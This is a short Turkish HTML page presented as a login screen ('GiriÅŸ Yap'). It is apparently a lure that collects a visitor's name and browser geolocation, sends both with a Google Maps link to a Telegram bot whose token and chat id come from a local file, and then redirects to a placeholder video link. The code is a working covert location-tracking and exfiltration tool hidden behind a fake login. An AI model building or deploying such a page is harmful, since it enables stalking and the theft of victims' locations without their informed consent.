<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>GiriÅŸ SayfasÄ±</title>
</head>
<body>
  <h2>GiriÅŸ Yap</h2>
  <input type="text" id="username" placeholder="AdÄ±nÄ±zÄ± girin">
  <button onclick="girisYap()">GiriÅŸ Yap</button>

  <script>
    async function girisYap() {
      const name = document.getElementById("username").value;
      if (!name) {
        alert("LÃ¼tfen adÄ±nÄ±zÄ± girin!");
        return;
      }

      if (!navigator.geolocation) {
        alert("TarayÄ±cÄ±nÄ±z konum izni desteklemiyor.");
        return;
      }

      navigator.geolocation.getCurrentPosition(async function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        // bilgiler.txt dosyasÄ±nÄ± oku
        const response = await fetch("bilgiler.txt");
        const text = await response.text();
        const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();

        const message = `ğŸ‘¤ Ä°sim: ${name}\nğŸ“ Konum: https://www.google.com/maps?q=${lat},${lon}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        await fetch(url);
        window.location.href = "-videouzantÄ±koy-"; // buraya videoyu sen koyacaksÄ±n
      });
    }
  </script>
</body>
</html>
